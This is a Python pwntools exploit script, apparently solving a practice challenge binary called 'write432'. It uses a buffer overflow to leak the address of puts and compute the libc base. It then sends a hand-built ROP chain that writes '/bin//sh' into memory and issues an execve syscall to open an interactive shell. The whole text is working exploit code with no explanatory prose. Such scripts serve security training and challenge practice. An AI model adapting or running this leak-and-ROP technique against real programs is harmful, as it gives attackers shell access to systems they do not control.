from pwn import *

context.arch = "i386"

e = ELF("./write432")
p = process(e.path)
p.sendline(cyclic(1000))
p.wait()
core = p.corefile
eip_offset = cyclic_find(core.eip)

info("Found eip_offset %d", eip_offset)

p = process(e.path)
p.recv()
puts_plt = 0x08048420
puts_got = 0x804a014
libc_puts = 0x00067240
main =  0x804857b

payload = cyclic(eip_offset)
payload += p32(puts_plt)
payload += p32(main)
payload += p32(puts_got)

p.sendline(payload)

leaked_puts = u32(p.recv()[0:4])
success("leaked_puts: %#x", leaked_puts)
libc_base = leaked_puts - libc_puts
success("libc_base: %#x", libc_base)

payload = ""
payload += cyclic(eip_offset)
payload += p32(libc_base + 0x00001aae) # pop edx ; ret
payload += p32(libc_base + 0x001d5040) # @ .data
payload += p32(libc_base + 0x00024a87) # pop eax ; ret
payload += '/bin'
payload += p32(libc_base + 0x00074a15) # mov dword ptr [edx], eax ; ret
payload += p32(libc_base + 0x00001aae) # pop edx ; ret
payload += p32(libc_base + 0x001d5044) # @ .data + 4
payload += p32(libc_base + 0x00024a87) # pop eax ; ret
payload += '//sh'
payload += p32(libc_base + 0x00074a15) # mov dword ptr [edx], eax ; ret
payload += p32(libc_base + 0x00001aae) # pop edx ; ret
payload += p32(libc_base + 0x001d5048) # @ .data + 8
payload += p32(libc_base + 0x0002e195) # xor eax, eax ; ret
payload += p32(libc_base + 0x00074a15) # mov dword ptr [edx], eax ; ret
payload += p32(libc_base + 0x00018be5) # pop ebx ; ret
payload += p32(libc_base + 0x001d5040) # @ .data
payload += p32(libc_base + 0x00193840) # pop ecx ; ret
payload += p32(libc_base + 0x001d5048) # @ .data + 8
payload += p32(libc_base + 0x00001aae) # pop edx ; ret
payload += p32(libc_base + 0x001d5048) # @ .data + 8
payload += p32(libc_base + 0x0002e195) # xor eax, eax ; ret
payload += p32(libc_base + 0x00024a68) # inc eax ; ret
payload += p32(libc_base + 0x00024a68) # inc eax ; ret
payload += p32(libc_base + 0x00024a68) # inc eax ; ret
payload += p32(libc_base + 0x00024a68) # inc eax ; ret
payload += p32(libc_base + 0x00024a68) # inc eax ; ret
payload += p32(libc_base + 0x00024a68) # inc eax ; ret
payload += p32(libc_base + 0x00024a68) # inc eax ; ret
payload += p32(libc_base + 0x00024a68) # inc eax ; ret
payload += p32(libc_base + 0x00024a68) # inc eax ; ret
payload += p32(libc_base + 0x00024a68) # inc eax ; ret
payload += p32(libc_base + 0x00024a68) # inc eax ; ret
payload += p32(libc_base + 0x00002d37) # int 0x80

p.sendline(payload)
p.interactive()
